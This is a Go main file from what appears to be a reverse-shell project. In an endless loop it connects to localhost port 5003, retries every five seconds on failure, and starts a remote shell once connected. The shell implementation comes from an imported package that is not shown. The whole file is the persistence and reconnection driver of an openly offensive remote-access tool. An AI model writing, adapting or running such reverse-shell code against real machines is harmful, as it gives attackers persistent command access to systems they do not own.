package main

import (
	"log"
	"reverse-shell/pkg/shell"
	"time"
)

func main() {
	for {
		log.Println("connecting...")

		s, err := shell.New("localhost", 5003)
		if err != nil {
			log.Println("failed connecting, reconnecting in 5 seconds:", err)
			time.Sleep(5 * time.Second)
			continue
		}

		log.Println("starting shell")
		s.Start()
	}
}
